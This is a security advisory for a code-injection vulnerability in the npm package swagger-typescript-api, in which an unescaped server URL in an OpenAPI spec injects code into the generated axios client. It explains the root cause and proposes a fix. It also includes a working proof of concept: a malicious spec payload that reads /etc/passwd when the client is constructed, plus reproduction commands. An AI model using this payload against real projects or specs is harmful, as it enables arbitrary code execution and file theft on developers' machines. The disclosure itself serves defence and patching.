# [H] swagger-typescript-api vulnerable to code injection via unescaped `servers[0].url` in axios http-client template

## Summary
Severity: High
Advisory: GHSA-38c3-wv3c-v3xj
CVE: CVE-2026-54661
CWE: CWE-1336, CWE-74, CWE-94
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-07-29
Source: https://github.com/advisories/GHSA-38c3-wv3c-v3xj
Type: github-advisory

## Affected
- npm: `swagger-typescript-api` — affected >=0 <13.12.2

## Details
### Summary

`swagger-typescript-api` interpolates `servers[0].url` directly into a TypeScript string literal inside the `HttpClient` constructor body of the generated **axios** client (`templates/base/http-clients/axios-http-client.ejs:71`), without any escaping. A malicious URL containing a `"` closes the string literal and exposes the surrounding *object-literal argument* of `axios.create({...})` to injection. A computed property key whose value is an IIFE executes arbitrary code every time `new HttpClient()` (or `new Api()`, which extends `HttpClient`) is constructed. The attacker controls the OpenAPI spec; the victim is any consumer of the generated client. Impact is arbitrary code execution with the importing process's privileges.

This is the *axios* sibling of the previously reported fetch-client RCE — same upstream variable (`apiConfig.baseUrl`, sourced from `servers[0].url`), same root cause class (raw `<%~ %>` interpolation of unescaped spec strings), different template file and different lifecycle frame (constructor body vs class-body static field). The single most maintainable fix — sanitizing `apiConfig.baseUrl` once at the source in `src/code-gen-process.ts:591` — closes both at once.

### Details

`createApiConfig` in `src/code-gen-process.ts:591` sets the templated `baseUrl` from the spec without sanitization:

```ts
return {
  ...
  baseUrl: serverUrl,     // <-- serverUrl = swaggerSchema.servers[0].url, raw
  ...
};
```

The axios http-client template (`templates/base/http-clients/axios-http-client.ejs:71`) then interpolates that value into a TS string literal inside the `HttpClient` constructor body:

```ejs
constructor({ securityWorker, secure, format, ...axiosConfig }: ApiConfig<SecurityDataType> = {}) {
    this.instance = axios.create({ ...axiosConfig, baseURL: axiosConfig.baseURL || "<%~ apiConfig.baseUrl %>" })
    ...
}
```

`<%~ %>` is Eta's raw, unescaped interpolation. The codebase's only escape function — `escapeJSDocContent` (`src/schema-parser/schema-formatters.ts:127`) — only replaces `*/` and is not applied to this path.

The injection sits inside a JavaScript *object literal* (the argument to `axios.create({...})`), so simple statement-level injection is not directly possible — but **computed property keys** are. A spec value of the form:

```
URL", [(IIFE)()]: 0, dummy: "
```

produces the following object literal:

```js
axios.create({
  ...axiosConfig,
  baseURL: axiosConfig.baseURL || "URL",
  [(IIFE)()]: 0,
  dummy: ""
})
```

The IIFE evaluates eagerly when the object literal is constructed — i.e. every time `new HttpClient()` runs. The trailing `dummy: ""` reopens a string that the template's own closing `"` terminates, keeping the file syntactically valid TypeScript.

**Lifecycle compared to the fetch sink:** the fetch template emits a class-body field initializer that fires at class-definition / module load. The axios sink emits inside the constructor and therefore fires one frame later, on `new HttpClient()`. In practice the trigger window is identical, because:

- Every README example in this repository does `const api = new Api()` at module top level.
- `Api` (in `default/api.ejs`) extends `HttpClient`, so `new Api()` invokes the `HttpClient` constructor via `super()`.
- Top-level `const api = new Api()` runs at module load — the consumer cannot import without instantiating in the documented usage pattern.

### PoC

Self-contained reproducer (`run.sh` runs end-to-end: install pinned package → generate from control + payload → bundle with esbuild → instantiate → check canary). Tested on `swagger-typescript-api@13.12.1` and Node `v24.11.1`.

**Malicious `servers[0].url`** (literal string, JSON-encoded in the spec below):

```
https://api.example.com", [(async () => { try { const fs = await import('node:fs'); const data = fs.readFileSync('/etc/passwd', 'utf8'); fs.writeFileSync('/tmp/sta_canary', data); } catch (e) {} return 'pwned'; })()]: 0, dummy: "
```

**Minimal payload spec:**

```json
{
  "openapi": "3.0.0",
  "info": { "title": "AxiosPayloadAPI", "version": "1.0.0" },
  "servers": [
    {
      "url": "https://api.example.com\", [(async () => { try { const fs = await import('node:fs'); const data = fs.readFileSync('/etc/passwd', 'utf8'); fs.writeFileSync('/tmp/sta_canary', data); } catch (e) {} return 'pwned'; })()]: 0, dummy: \""
    }
  ],
  "paths": {
    "/ping": {
      "get": {
        "operationId": "ping",
        "responses": { "200": { "description": "OK" } }
      }
    }
  }
}
```

**Steps:**

```bash
npm install swagger-typescript-api@13.12.1 esbuild axios
node -e "import('swagger-typescript-api').then(m => m.generateApi({
  name: 'Api.ts', output: process.cwd() + '/out',
  input: process.cwd() + '/payload-spec.json', httpClientType: 'axios'
}))"
npx esbuild out/Api.ts --bundle --format=esm --platform=node \
  --external:axios --tsconfig-raw='{}' --outfile=out/Api.bundle.mjs
rm -f /tmp/sta_canary
node --input-type=module -e "
  const mod = await import('./out/Api.bundle.mjs');
  new mod.HttpClient();
  await new Promise(r => setTimeout(r, 300));
"
ls -la /tmp/sta_canary && cat /tmp/sta_canary
```

**Generated `out/Api.ts` (constructor — payload, Biome-formatted):**

```ts
constructor({
  securityWorker,
  secure,
  format,
  ...axiosConfig
}: ApiConfig<SecurityDataType> = {}) {
  this.instance = axios.create({
    ...axiosConfig,
    baseURL: axiosConfig.baseURL || "https://api.example.com",
    [(async () => {
      try {
        const fs = await import("node:fs");
        const data = fs.readFileSync("/etc/passwd", "utf8");
        fs.writeFileSync("/tmp/sta_canary", data);
      } catch (e) {}
      return "pwned";
    })()]: 0,
    dummy: "",
  });
  this.secure = secure;
  this.format = format;
  this.securityWorker = securityWorker;
}
```

The `[(async () => { ... })()]: 0` is a real computed object-literal key — Biome only reformats syntactically valid TypeScript, so the multi-line indented output proves it parsed. The IIFE evaluates when the `axios.create({...})` argument is constructed (during the `HttpClient` constructor), schedules `fs.readFileSync('/etc/passwd')`, and writes the exfiltrated contents to `/tmp/sta_canary`.

**Result:** after `new HttpClient()`, `/tmp/sta_canary` contains the full `/etc/passwd` of the importing process (1470 bytes on a typical Linux host). Control spec (`servers[0].url: "https://api.example.com"`) generates a clean `baseURL: ... || "https://api.example.com"` and writes no canary.

### Impact

**Type:** Code injection in generated output (CWE-94) / template-engine injection (CWE-1336).

**Affected use cases:** any developer or pipeline that runs `swagger-typescript-api` with `httpClientType: "axios"` (or `--http-client axios`) against an OpenAPI spec they did not author entirely:

- `sta generate --http-client axios --url https://attacker.example/openapi.json` — a public, third-party, or attacker-hosted spec.
- A CI/CD pipeline regenerating axios-based clients from a vendor / partner spec on each build.
- A multi-tenant SaaS that generates per-tenant axios clients from tenant-supplied specs.
- Any project pinned to a spec file that a contributor can modify via PR.

**Lifecycle:** the injected IIFE fires when `new HttpClient()` is constructed. In the standard usage pattern (`const api = new Api()` at module top level), this is effectively at first import — `Api extends HttpClient` and the `super()` call invokes the affected constructor. A consumer cannot use the generated client without constructing it.

**Privilege:** the IIFE runs with the full privileges of the importing process — read any file the importer can read, write any file, exfiltrate secrets, spawn child processes, etc.

**Suggested fix:** sanitize `apiConfig.baseUrl` once at the source in `src/code-gen-process.ts:591`:

```ts
// in createApiConfig
baseUrl: escapeJsStringLiteral(serverUrl),
```

where `escapeJsStringLiteral` produces a properly-escaped JS string literal — at minimum escaping `"`, `\`, `\n`, `\r`, `\t`, `\b`, `\f`, `\v`, `\0`, and the line/paragraph separators ` ` / ` `. `JSON.stringify(serverUrl).slice(1, -1)` is a one-line acceptable implementation. **This single change closes both this advisory and the previously reported fetch-client variant** without further template edits.

If a template-side fix is preferred instead, both `templates/base/http-clients/fetch-http-client.ejs:75` and `templates/base/http-clients/axios-http-client.ejs:71` need their `<%~ apiConfig.baseUrl %>` swapped for the escaped form — fixing only one leaves the other exploitable.

Submitted by: Hamza Haroon (thegr1ffyn)

## References
- https://github.com/acacode/swagger-typescript-api/security/advisories/GHSA-38c3-wv3c-v3xj
- https://github.com/acacode/swagger-typescript-api/pull/1779
- https://github.com/acacode/swagger-typescript-api/commit/306d59acb8ffbb00f953f807b97234b21f51d9de
- https://github.com/acacode/swagger-typescript-api
- https://github.com/acacode/swagger-typescript-api/releases/tag/v13.12.2
